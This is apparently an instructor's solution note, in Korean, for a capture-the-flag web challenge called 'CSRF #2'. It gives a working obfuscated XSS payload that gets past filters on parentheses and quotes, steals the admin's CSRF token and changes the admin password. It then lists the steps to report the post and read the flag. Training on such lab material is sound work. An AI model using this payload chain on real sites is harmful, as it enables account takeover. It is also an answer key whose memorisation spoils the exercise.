# [강사용] CSRF #2 (원본 풀이)
괄호·따옴표 차단 → Set.constructor 백틱 XSS 로 admin 권한에서 csrf_token 누출 후 changepw 호출:
```html
<script>Set[`co`+`nst`+`ructor`]`f\\x65tch(\\x27/changepw\\x27).then(e=>e.text()).then(e=>{index=e.indexOf(\\x27name="csrf_token" value="\\x27)+25;csrf_token=e.slice(index,index+32);f\\x65tch(\\x27/changepw?userid=admin&userpw=haha&csrf_token=\\x27+csrf_token)})```</script>
```
신고 `http://csrf-2:9105/board/<seq>` → admin/haha 로그인 → `/board/0` flag.
